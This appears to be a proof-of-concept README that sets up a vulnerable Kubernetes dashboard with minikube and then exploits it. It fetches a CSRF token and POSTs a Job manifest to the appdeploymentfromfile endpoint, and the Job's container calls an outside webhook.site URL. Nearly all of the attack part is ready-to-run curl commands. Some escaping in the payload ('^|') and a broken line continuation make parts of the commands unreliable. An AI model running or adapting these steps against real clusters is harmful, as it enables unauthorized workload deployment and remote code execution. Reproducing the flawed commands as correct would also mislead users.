# Vulnerable Kubernetes Dashboard
we need docker to run the vulnerable kubernetes dashboard
```bash
curl -Lo minikube https://github.com/kubernetes/minikube/releases/latest/download/minikube-linux-amd64
./minikube start
./minikube dashboard
```
Ref: https://minikube.sigs.k8s.io/docs/start/?arch=%2Flinux%2Fx86-64%2Fstable%2Fbinary+download#Service
Ref: https://minikube.sigs.k8s.io/docs/handbook/dashboard/

## Exploitation steps
1. Start the vulnerable kubernetes dashboard
2. Get the port number of the kubernetes dashboard service and replace it in the curl commands below
```bash
# we need to get a fresh csrf token
curl 'http://127.0.0.1:43479/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/api/v1/csrftoken/appdeploymentfromfile' \
  --compressed \
  -H 'Accept: application/json, text/plain, */*' \
#  {
# "token": "TIM-HcANnZ3XwpXVB9D745jtuYo:1753310053154"
#  }


# Change the old CSRF token(X-CSRF-TOKEN) to create a job
# Change the curl -s .... command to your webhook URL
curl 'http://127.0.0.1:43479/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/api/v1/appdeploymentfromfile' \
  --compressed \
  -X POST \
  -H 'X-CSRF-TOKEN: TIM-HcANnZ3XwpXVB9D745jtuYo:1753310053154' \
  -H 'Content-Type: application/json' \
  --data-raw '{"name":"","namespace":"default","content":"apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: curl-job\n  labels:\n    app: curl-example\nspec:\n  template:\n    metadata:\n      labels:\n        app: curl-example\n    spec:\n      containers:\n      - name: curl-container\n        image: curlimages/curl:latest\n        command: [\"/bin/sh\", \"-c\"]\n        args:\n        - ^|\n          curl -s https://webhook.site/0725a73b-854d-431f-92ae-de61dcfc2d57 ^|^| exit 0\n      restartPolicy: OnFailure\n  backoffLimit: 3\n  completions: 1","validate":true}'
  
```